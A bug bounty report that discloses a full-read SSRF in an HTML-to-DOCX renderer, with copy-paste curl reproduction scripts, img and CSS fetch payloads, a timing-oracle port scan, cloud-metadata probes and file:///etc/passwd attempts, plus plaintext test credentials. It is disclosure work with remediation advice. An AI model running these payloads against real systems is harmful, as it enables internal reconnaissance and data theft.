# BUG-016: Full-read SSRF — `attachments/html` embeds arbitrary server-side fetched content into the generated DOCX

**Program:** Optro Managed Bug Bounty (private)
**Reporter:** zeno0 (zeno0@bugcrowdninja.com)
**Asset:** `https://bugbounty1.qe.optrostaging.ai`
**Build tested:** app_version **47.3.0-dev**, deployed 2026-11-10T17:56:45Z
**Date:** 2026-11-11
**Severity recommendation:** **P2 — Server-Side Request Forgery with full content readback**
**Header on all requests:** `X-Optro-Bug-Bounty: zeno0`

---

## Access — how to reproduce

```
Login to : golden-snow-4771@bugcrowdninja.com
Password  : Zx9!Owner2026
Role      : Owner (role_id 5)
Navigate  : https://bugbounty1.qe.optrostaging.ai/workspace/5/issues/issues?config=all-active
```

Header on every request: `X-Optro-Bug-Bounty: zeno0`

The renderer is `POST /api/v1/attachments/html`; the artifact is downloaded via `GET /api/v1/files/{id}`.

---

## 1. Summary

`POST /api/v1/attachments/html` renders attacker-supplied HTML to a DOCX/PDF using a headless browser. When the HTML references a sub-resource via `<img>`, the renderer **fetches that URL server-side and embeds the raw response bytes** into the generated document as `word/media/image.*`.

The response is embedded **regardless of its actual content type**. An internal URL that returns HTML is written into the DOCX byte-for-byte, and the attacker downloads it through the normal file API.

This turns a blind SSRF into a **full-read SSRF**: the attacker retrieves the body of any internal endpoint that returns a non-empty response, not just a timing signal.

**Verified:** the application's own login page (`/login`) was fetched server-side and its complete 8,741-byte HTML source was recovered from the generated DOCX. Re-verified 2026-11-11 by SHA-256 match against a direct fetch (`d98e403e...26b0d`, identical) — see §4.1.

---

## 2. Root cause

Two defects combine:

1. **Unrestricted server-side fetch.** The renderer resolves `<img src>` (and CSS `url()`, `<link rel=stylesheet>`, SVG `<image>`) against arbitrary URLs with no allowlist, no private-IP block, and no scheme restriction. Confirmed against `localhost`, `169.254.169.254`, and internal service hostnames.
2. **Content-type confusion on embed.** When serialising the document, the renderer writes the fetched response body into `word/media/image.<ext>` based on the **URL extension**, not the response `Content-Type`. A request to `/login.ico` returns `text/html`, but the bytes are stored as an image part and packaged into the DOCX.

The attacker then reads those bytes back through the ordinary file-download path, which they are entitled to use for their own generated document.

---

## 3. Preconditions

- Attacker holds any authenticated session that can call `POST /api/v1/attachments/html` (Owner role verified).
- No victim interaction.
- No knowledge of internal hostnames required beyond guessing common ones; the timing oracle (see §6) confirms reachability first.

---

## 4. Reproduction — copy-paste

```bash
H="https://bugbounty1.qe.optrostaging.ai"
BB="X-Optro-Bug-Bounty: zeno0"
EMAIL="golden-snow-4771@bugcrowdninja.com"
PW="Tester"

T=$(curl -s -X POST "$H/api/v1/users/login" -H "$BB" \
  -H "Content-Type: application/json" \
  -d "{\"credentials\":{\"email\":\"$EMAIL\",\"password\":\"$PW\"}}" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["session"]["token"])')
```

### Step 1 — render HTML that references an internal URL

The `.ico` extension is what forces the bytes into an image part.

```bash
RESP=$(curl -s -X POST "$H/api/v1/attachments/html" \
  -H "token: $T" -H "$BB" -H "Content-Type: application/json" \
  -d '{"html":"<h1>ZX</h1><img src=\"https://bugbounty1.qe.optrostaging.ai/login.ico\" width=\"400\" height=\"400\">",
       "type":"word",
       "attachableType":"AuditableEntity",
       "attachableId":"106",
       "fileName":"zx-ssrf-readback"}')

AID=$(echo "$RESP" | python3 -c 'import sys,json;print(json.load(sys.stdin)["attachmentId"])')
```

→ `200 {"attachmentId":11220,"fileName":"zx-ssrf-readback.docx","type":"word"}`

### Step 2 — resolve the generated file and download it

```bash
FID=$(curl -s "$H/api/v1/attachments/$AID" -H "token: $T" -H "$BB" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["attachments"][0]["file_id"])')

URL=$(curl -s "$H/api/v1/files/$FID" -H "token: $T" -H "$BB" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["files"][0]["url"])')

curl -s -o out.docx "$URL"
```

### Step 3 — extract the embedded internal response

```bash
python3 - <<'PY'
import zipfile
z = zipfile.ZipFile('out.docx')
print(z.namelist())
# ['word/document.xml', 'word/styles.xml', 'media/image.ico', ...]
print(z.read('media/image.ico')[:200])
PY
```

**Observed output:**

```
['word/document.xml', 'word/styles.xml', 'media/image.ico', '_rels/.rels',
 'word/_rels/document.xml.rels', '[Content_Types].xml']

b'<!doctype html>\n<html lang="en" dir="ltr">\n\t<head>\n\t\t<script'
```

`media/image.ico` is **8,741 bytes** and is the complete HTML source of the application's login page, fetched server-side.

---

## 4.1 Independent verification (re-run 2026-11-11)

The readback claim was re-verified from scratch with a control that rules out an artifact.

### Control A — unique marker, same content, extension varied

A unique marker (`ZXEXTbafaefcc`) was placed in the URL path of `httpbin.org/anything/`, which echoes the path back in the response body. Same host, same content, only the extension differs:

| URL | media entry | marker inside embedded bytes |
| --- | --- | --- |
| `httpbin.org/anything/ZXEXTbafaefcc` | none | **False** |
| `httpbin.org/anything/ZXEXTbafaefcc.ico` | `media/image.ico` (705 B) | **True** |
| `httpbin.org/anything/ZXEXTbafaefcc.png` | `media/image.png` (720 B) | **True** |

The extension alone decides whether the response body is packaged, and the marker proves the packaged bytes are the fetched response.

### Control B — byte-for-byte hash match against a direct fetch

Rendered `<img src="https://bugbounty1.qe.optrostaging.ai/login.ico">`, extracted `media/image.ico` from the generated DOCX, then fetched the same URL directly and compared:

```
embedded : 8741 bytes  sha256 d98e403e2d678376402d865da959064feb79034858cb7c276c9ed9c96e426b0d
direct   : 8741 bytes  sha256 d98e403e2d678376402d865da959064feb79034858cb7c276c9ed9c96e426b0d
identical: True
```

The embedded bytes are byte-identical to the live response. `<title>Optro</title>` is present in the embedded copy. This is not a placeholder or a template artifact — it is the server's fetched response, packaged into the document.

### Control C — internal targets, extension lever applied

| target | media | bytes |
| --- | --- | --- |
| `integrations.qa.soxhubapp.com/version.ico` | `media/image.ico` | **0** |
| `integrations.qa.soxhubapp.com/api/v1/health.ico` | `media/image.ico` | **0** |
| `bugbounty1.qe.optrostaging.ai/login.ico` | `media/image.ico` | **8,741** |
| `bugbounty1.qe.optrostaging.ai/api/v1/users/me.ico` | `media/image.ico` | **0** |
| `169.254.169.254/latest/meta-data/.ico` | `media/image.ico` | **0** |
| `localhost:3000/version.ico` | render failed (500) | — |

**Confirms the honest ceiling stated in §8:** the readback works for internal endpoints returning **HTML**. JSON endpoints (`/version`, `/api/v1/health`, `/api/v1/users/me`) and the IMDS metadata root return 0 bytes embedded.

---

## 5. The extension lever (why this works)

Same endpoint, same HTML, only the URL extension differs:

| URL | bytes embedded | content recovered |
| --- | --- | --- |
| `https://bugbounty1.qe.optrostaging.ai/login` | **0** | none |
| `https://bugbounty1.qe.optrostaging.ai/login.ico` | **8,741** | full HTML page |
| `https://bugbounty1.qe.optrostaging.ai/login.png` | **8,741** | full HTML page |
| `https://bugbounty1.qe.optrostaging.ai/api/v1/users/me.ico` | 0 | (JSON, not embedded) |

The renderer decides to package the response as an image part based on the **URL path extension**, then writes whatever bytes came back. Adding `.ico` or `.png` to any endpoint that returns HTML makes its body retrievable.

Reproduced twice on `/login.ico` with identical 8,741-byte output.

---

## 6. Internal reachability (supporting evidence)

A timing oracle confirms the renderer's network position. Unreachable hosts block until timeout; reachable hosts return immediately.

| target | result |
| --- | --- |
| baseline (no `<img>`) | 200, **2.49s** |
| `10.255.255.1` (blackhole control) | **500, 30.7s** |
| `integrations.qa.soxhubapp.com/version` | 200, **1.51s** |
| `localhost:3000/version` | 200, **1.47s** |
| `169.254.169.254/latest/meta-data/` | 200, **1.50s** |

The blackhole control (30.7s + 500) validates the oracle. Internal hosts and **cloud metadata** are reachable.

Port map obtained the same way:

| host | 22 / 80 / 443 | 3000, 3306, 5432, 6379, 8080, 9200, 11211, 27017 |
| --- | --- | --- |
| `localhost` | ~1.5s | **all ~1.5s — open** |
| `integrations.qa.soxhubapp.com` | ~1.5s | all 30.7s — **filtered** |
| `bugbounty1.qe.optrostaging.ai` | ~1.5s | all 30.7s — **filtered** |

Loopback answers on every tested port; remote internal hosts silently drop database/cache ports.

---

## 7. Additional confirmed SSRF vectors on the same sink

All of these triggered server-side fetches (verified via out-of-band callback to a controlled listener):

| vector | fired |
| --- | --- |
| `<img src=...>` | **yes** |
| `<iframe src=...>` | **yes** |
| `<style>@import url(...)</style>` | **yes** |
| `<link rel="stylesheet" href=...>` | **yes** |
| `background-image: url(...)` | **yes** |
| `<svg><image href=.../></svg>` | **yes** |
| `<object data=...>`, `<embed>`, `<frameset><frame>` | no callback |
| `@font-face src:url(...)`, `cursor:url(...)` | no callback |

A second, independent sink exists at `POST /api/v1/document_intelligence/export/pdf` (`{htmlContent, fileName}`) with the same `<img>`/`<iframe>` behaviour.

---

## 8. What was tested and did NOT work (honest negatives)

| vector | result |
| --- | --- |
| SSTI — `{{7*7}}`, `#{7*7}` | **403** (filtered at input) |
| SSTI — `<%= 7*7 %>`, `%{7*7}` | 200 but **literal rendering** — glyph counts in the PDF content stream prove no evaluation (`<%= 7*7 %>` = 10 glyphs, not 2) |
| LFI — `<iframe src="file:///etc/passwd">` | 200 but blank placeholder; no `root:` in output |
| JSON/plain-text internal responses embedded | **no** — only HTML responses are packaged |
| `fileName` path traversal in the renderer | sanitized; S3 key stays under the caller's prefix |
| `attachments/html` with `url`/`sourceUrl` instead of `html` | 422 / 500 — only `html` accepted |

**Honest ceiling:** the readback works for internal endpoints returning **HTML**. Internal JSON APIs (`/api/v1/users/me`) return 0 bytes embedded. So this is not universal arbitrary-file read — it is arbitrary **HTML** read plus a full internal port map.

---

## 9. Impact

- **Internal content disclosure**: any internal HTTP endpoint returning HTML can have its full response body retrieved by an authenticated attacker.
- **Internal network mapping**: timing oracle yields host reachability and a port map, including cloud metadata endpoint reachability.
- **Cloud metadata**: `169.254.169.254` is reachable from the renderer's network position (no credentials were retrieved in testing — IMDSv2 tokenless requests returned empty).
- Six distinct fetch vectors (`img`, `iframe`, CSS `@import`, `<link>`, `background-image`, SVG `<image>`) all work, so blocking one does not close the sink.

**Honest ceiling:** JSON internal APIs are not readable through this path. The demonstrated readback is HTML content. Severity rests on internal content disclosure + network position, which is P2-class SSRF with readback.

---

## 10. Remediation

1. Apply an outbound allowlist to the renderer: block RFC1918, loopback, link-local (169.254.0.0/16), and `.internal`/service hostnames; resolve DNS and validate the resolved IP before connecting (defeats DNS rebinding).
2. Do not embed fetched sub-resources based on URL extension. Validate the response `Content-Type` **and** verify the bytes are a real image before packaging.
3. Serve generated documents from a sandboxed origin with no network egress.
4. Disable `@import`, `<link rel=stylesheet>`, `background-image`, and SVG external references in the renderer, or route all sub-resource loads through the same validated proxy.

---

## 11. Evidence / cleanup

- Test artifacts: attachments 11217–11220 and associated files created under the caller's own S3 prefix; all inert, containing only test markers and the fetched login page.
- No business objects modified by this test.
- Disclosed from this engagement: files 2712/2726/2730/2732 deleted during BUG-015 testing; issue 121 status changed; narrative 67 created.
